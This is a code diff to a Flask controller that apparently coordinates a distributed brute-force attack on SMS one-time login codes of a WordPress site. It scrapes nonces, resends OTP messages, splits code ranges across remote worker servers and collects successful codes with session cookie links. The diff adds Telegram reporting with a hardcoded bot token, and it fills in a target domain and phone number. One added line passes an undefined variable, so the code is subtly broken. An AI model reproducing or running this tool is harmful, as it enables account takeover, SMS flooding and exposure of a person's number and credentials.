@@ -9,6 +9,10 @@ import uuid
 app = Flask(__name__)
 socketio = SocketIO(app)
 
+# Telegram configuration
+TELEGRAM_BOT_TOKEN = "6374641003:AAFG0isVhi6pxBzZDythU96FaTrtEiVQIHY"
+TELEGRAM_CHAT_ID = "-4796694839"
+
 REMOTE_SERVERS = [
     "http://63.142.254.127:5000",
     "http://63.142.246.30:5000",
@@ -38,7 +42,34 @@ progress_log = []
 found_success = False
 success_codes = []
 proxy_setting = ""
-current_operation = {}  # Store current operation details
+current_operation = {}
+
+# Telegram message sending function
+def send_to_telegram(message):
+    try:
+        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
+        payload = {
+            "chat_id": TELEGRAM_CHAT_ID,
+            "text": message,
+            "parse_mode": "HTML"
+        }
+        response = requests.post(url, json=payload, timeout=10)
+        response.raise_for_status()
+        return True
+    except Exception as e:
+        print(f"Failed to send Telegram message: {str(e)}")
+        return False
+
+# Example usage of Telegram sending
+def log_to_telegram_example():
+    message = (
+        "🔔 <b>Server Update</b>\n"
+        f"📅 Time: {time.strftime('%Y-%m-%d %H:%M:%S')}\n"
+        "ℹ️ Operation started on central server\n"
+        f"🔧 Servers: {len(REMOTE_SERVERS)} active\n"
+        "📡 Status: Initializing..."
+    )
+    send_to_telegram(message)
 
 def get_proxy_from_central():
     return "socks5://new_user:new_pass@new_host:new_port"
@@ -49,7 +80,9 @@ def update_proxy_from_central():
         if not proxy_setting:
             new_proxy = get_proxy_from_central()
             proxy_setting = new_proxy
-            progress_log.append(f"Updated proxy from central: {new_proxy}")
+            message = f"🔄 Proxy updated: {new_proxy}"
+            progress_log.append(message)
+            send_to_telegram(message)
             socketio.emit('update_progress', {'log': progress_log[-1]})
         time.sleep(1)
 
@@ -57,13 +90,11 @@ threading.Thread(target=update_proxy_from_central, daemon=True).start()
 
 def fetch_nonce(host, mobile):
     try:
-        # First request to get user_login_nonce
         response = requests.get(f"https://{host}/login/", timeout=10)
         response.raise_for_status()
         soup = BeautifulSoup(response.text, 'html.parser')
         user_login_nonce = soup.find('input', {'id': 'user_login_nonce'})['value']
         
-        # Second request to get login_otp_nonce
         response = requests.post(
             f"https://{host}/wp-admin/admin-ajax.php",
             headers={
@@ -80,9 +111,13 @@ def fetch_nonce(host, mobile):
         soup = BeautifulSoup(response.text, 'html.parser')
         login_otp_nonce = soup.find('input', {'id': 'login_otp_nonce'})['value']
         
+        message = f"✅ Nonce fetched successfully for {host}"
+        send_to_telegram(message)
         return login_otp_nonce
     except Exception as e:
-        progress_log.append(f"Failed to fetch nonce: {str(e)}")
+        message = f"❌ Failed to fetch nonce for {host}: {str(e)}"
+        progress_log.append(message)
+        send_to_telegram(message)
         socketio.emit('update_progress', {'log': progress_log[-1]})
         return None
 
@@ -100,12 +135,16 @@ def resend_otp(host, mobile, nonce):
         )
         response.raise_for_status()
         if response.json().get("success"):
-            progress_log.append("SMS resent successfully")
+            message = f"📤 SMS resent successfully for {mobile}"
+            progress_log.append(message)
+            send_to_telegram(message)
             socketio.emit('update_progress', {'log': progress_log[-1]})
             return True
         return False
     except Exception as e:
-        progress_log.append(f"Failed to resend SMS: {str(e)}")
+        message = f"❌ Failed to resend SMS for {mobile}: {str(e)}"
+        progress_log.append(message)
+        send_to_telegram(message)
         socketio.emit('update_progress', {'log': progress_log[-1]})
         return False
 
@@ -114,6 +153,9 @@ def auto_stop_and_restart():
     time.sleep(20 * 60)  # 20 minutes
     stop_all_servers()
     
+    message = "⏹️ All servers stopped after 20 minutes"
+    send_to_telegram(message)
+    
     # Wait until all servers are stopped
     while True:
         status = get_worker_status()
@@ -121,35 +163,39 @@ def auto_stop_and_restart():
             break
         time.sleep(1)
     
+    message = "✅ All servers confirmed stopped"
+    send_to_telegram(message)
+    
     if not found_success and current_operation:
-        # دریافت nonce جدید
-        new_nonce = fetch_nonce(current_operation['host'], current_operation['mobile'])
-        if new_nonce:
-            # به‌روزرسانی nonce در current_operation
-            current_operation['nonce'] = new_nonce
-            # ارسال مجدد SMS با nonce جدید
-            if resend_otp(current_operation['host'], current_operation['mobile'], new_nonce):
-                # راه‌اندازی مجدد کارگرها با پارامترهای قبلی
-                threads = []
-                for i, server in enumerate(REMOTE_SERVERS):
-                    start_r, end_r = current_operation['ranges'][i]
-                    thread = threading.Thread(
-                        target=send_to_remote,
-                        args=(server, current_operation['host'], new_nonce,
-                              current_operation['mobile'], current_operation['connections'],
-                              start_r, end_r)
-                    )
-                    threads.append(thread)
-                    thread.start()
-                
-                for thread in threads:
-                    thread.join()
-                
-                # برنامه‌ریزی توقف بعدی
-                threading.Thread(target=auto_stop_and_restart, daemon=True).start()
+        # Resend SMS
+        if resend_otp(current_operation['host'], current_operation['mobile'], current_operation['nonce']):
+            # Restart workers with same parameters
+            threads = []
+            for i, server in enumerate(REMOTE_SERVERS):
+                start_r, end_r = current_operation['ranges'][i]
+                thread = threading.Thread(
+                    target=send_to_remote,
+                    args=(server, current_operation['host'], current_operation['nonce'],
+                          current_operation['mobile'], current_operation['connections'],
+                          start_r, end_r)
+                )
+                threads.append(thread)
+                thread.start()
+            
+            for thread in threads:
+                thread.join()
+            
+            message = f"🔄 Operation restarted with ranges {current_operation['ranges']}"
+            send_to_telegram(message)
+            
+            # Schedule next auto-stop
+            threading.Thread(target=auto_stop_and_restart, daemon=True).start()
         else:
-            progress_log.append("Failed to fetch new nonce for resending SMS")
-            socketio.emit('update_progress', {'log': progress_log[-1]})
+            message = "❌ Failed to resend OTP, operation not restarted"
+            send_to_telegram(message)
+    else:
+        message = "ℹ️ No restart needed: Success found or no operation active"
+        send_to_telegram(message)
 
 def send_to_remote(server_url, host, nonce, mobile, connections, start_range, end_range):
     try:
@@ -167,20 +213,28 @@ def send_to_remote(server_url, host, nonce, mobile, connections, start_range, en
             timeout=10
         )
         response.raise_for_status()
-        progress_log.append(f"Request sent to {server_url} for range {start_range}-{end_range}")
+        message = f"📤 Request sent to {server_url} for range {start_range}-{end_range}"
+        progress_log.append(message)
+        send_to_telegram(message)
         socketio.emit('update_progress', {'log': progress_log[-1]})
     except requests.exceptions.RequestException as e:
-        progress_log.append(f"Failed to send request to {server_url}: {str(e)}")
+        message = f"❌ Failed to send request to {server_url}: {str(e)}"
+        progress_log.append(message)
+        send_to_telegram(message)
         socketio.emit('update_progress', {'log': progress_log[-1]})
 
 def stop_all_servers():
     for server in REMOTE_SERVERS:
         try:
             requests.post(f"{server}/stop", timeout=5)
-            progress_log.append(f"Stop request sent to {server}")
+            message = f"⏹️ Stop request sent to {server}"
+            progress_log.append(message)
+            send_to_telegram(message)
             socketio.emit('update_progress', {'log': progress_log[-1]})
         except requests.exceptions.RequestException as e:
-            progress_log.append(f"Failed to stop {server}: {str(e)}")
+            message = f"❌ Failed to stop {server}: {str(e)}"
+            progress_log.append(message)
+            send_to_telegram(message)
             socketio.emit('update_progress', {'log': progress_log[-1]})
 
 def get_worker_status():
@@ -202,7 +256,9 @@ def get_worker_status():
                 code = status["error"].split("Code ")[1].split(" found")[0]
                 if not any(s["code"] == code for s in success_codes):
                     success_codes.append({"server": server, "code": code, "cookie_link": f"{server}/last_cookie"})
-                progress_log.append(f"Success found on {server}! Stopping all servers...")
+                message = f"🎉 Success found on {server}! Code: {code}\nStopping all servers..."
+                progress_log.append(message)
+                send_to_telegram(message)
                 socketio.emit('update_progress', {'log': progress_log[-1]})
                 stop_all_servers()
         except requests.exceptions.RequestException as e:
@@ -212,6 +268,8 @@ def get_worker_status():
                 "processed": "-",
                 "error": f"Failed to connect: {str(e)}"
             }
+            message = f"⚠️ Status check failed for {server}: {str(e)}"
+            send_to_telegram(message)
     return status_data
 
 @app.route('/')
@@ -245,7 +303,7 @@ def index():
                 <form id="form" class="space-y-6">
                     <div>
                         <label class="block text-sm font-medium text-gray-700">هاست:</label>
-                        <input type="text" id="host" class="mt-1 block w-full p-3 border rounded-lg" value="ram.com">
+                        <input type="text" id="host" class="mt-1 block w-full p-3 border rounded-lg" value="iranigram.com">
                     </div>
                     <div>
                         <label class="block text-sm font-medium text-gray-700">Nonce:</label>
@@ -253,7 +311,7 @@ def index():
                     </div>
                     <div>
                         <label class="block text-sm font-medium text-gray-700">شماره موبایل:</label>
-                        <input type="text" id="mobile" class="mt-1 block w-full p-3 border rounded-lg" value="09">
+                        <input type="text" id="mobile" class="mt-1 block w-full p-3 border rounded-lg" value="09214541602">
                     </div>
                     <div>
                         <label class="block text-sm font-medium text-gray-700">تعداد کانکشن‌ها:</label>
@@ -261,7 +319,7 @@ def index():
                     </div>
                     <div>
                         <label class="block text-sm font-medium text-gray-700">پروکسی (SOCKS5):</label>
-                        <input type="text" id="proxy" class="mt-1 block w-full p-3 border rounded-lg" placeholder="مثال: socks5://user:pass@host:port" value="51.195.229.194:13001">
+                        <input type="text" id="proxy" class="mt-1 block w-full p-3 border rounded-lg" placeholder="مثال: socks5://user:pass@host:port">
                     </div>
                     <div>
                         <label class="block text-sm font-medium text-gray-700">نوع اسکن:</label>
@@ -518,7 +576,9 @@ def start():
     found_success = False
     progress_log = []
     success_codes = []
-    progress_log.append("Starting distribution to remote servers...")
+    message = f"🚀 Starting operation\nHost: {host}\nMobile: {mobile}\nConnections: {connections}\nScan Type: {scan_type}"
+    progress_log.append(message)
+    send_to_telegram(message)
     socketio.emit('update_progress', {'log': progress_log[-1]})
 
     if scan_type == 'full':
@@ -537,14 +597,13 @@ def start():
     threads = []
     for i, server in enumerate(REMOTE_SERVERS):
         start_r, end_r = ranges[i]
-        thread = threading.Thread(target=send_to_remote, args=(server, host, nonce, mobile, connections, start_r, end_r))
+        thread = threading.Thread(target=send_to_remote, args=(server, host,weather, nonce, mobile, connections, start_r, end_r))
         threads.append(thread)
         thread.start()
 
     for thread in threads:
         thread.join()
 
-    # Store operation details
     current_operation = {
         'host': host,
         'nonce': nonce,
@@ -554,7 +613,6 @@ def start():
         'proxy': proxy_setting
     }
     
-    # Start auto-stop and restart thread
     threading.Thread(target=auto_stop_and_restart, daemon=True).start()
 
     return '', 204
@@ -563,6 +621,9 @@ def start():
 def stop():
     global progress_log
     stop_all_servers()
+    message = "🛑 Manual stop requested by user"
+    progress_log.append(message)
+    send_to_telegram(message)
     return '', 204
 
 @app.route('/set_proxy', methods=['POST'])
@@ -570,7 +631,9 @@ def set_proxy():
     global proxy_setting
     data = request.get_json()
     proxy_setting = data.get('proxy', '')
-    progress_log.append(f"Proxy set to: {proxy_setting}")
+    message = f"🔧 Proxy set to: {proxy_setting}"
+    progress_log.append(message)
+    send_to_telegram(message)
     socketio.emit('update_progress', {'log': progress_log[-1]})
     return '', 204
 
